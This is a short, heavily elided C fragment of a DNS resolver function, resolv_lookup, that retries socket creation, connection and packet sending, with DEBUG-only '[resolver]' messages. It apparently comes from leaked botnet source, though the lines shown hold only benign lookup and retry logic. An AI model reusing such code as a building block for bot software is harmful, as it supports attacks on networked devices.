...
struct resolv_entries *resolv_lookup(char *domain)
{
    ...
    while (tries++ < 5)
    {
        ...
        {
#ifdef DEBUG
            printf("[resolver] Error Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[resolver] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[resolver] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }
...
#ifdef DEBUG
                        printf("[resolver] Success Found IP address: %08x\n", (*p));
#endif
                    }
